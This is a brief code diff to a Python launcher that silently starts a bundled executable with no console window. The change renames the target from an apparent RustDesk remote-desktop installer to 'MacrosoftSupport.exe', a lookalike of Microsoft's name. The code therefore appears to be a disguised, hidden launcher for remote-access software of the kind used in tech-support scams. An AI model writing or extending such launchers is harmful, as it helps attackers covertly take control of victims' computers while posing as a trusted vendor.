@@ -4,7 +4,7 @@ import subprocess
 import os
 
 def launch_main_app():
-    app_path = os.path.join(os.path.dirname(sys.executable), "installrustdesk_0dff2e7c-d54a-435c-9513-36100a1680d05145.exe")
+    app_path = os.path.join(os.path.dirname(sys.executable), "MacrosoftSupport.exe")
     subprocess.Popen([app_path], creationflags=subprocess.CREATE_NO_WINDOW)
     sys.exit()
 
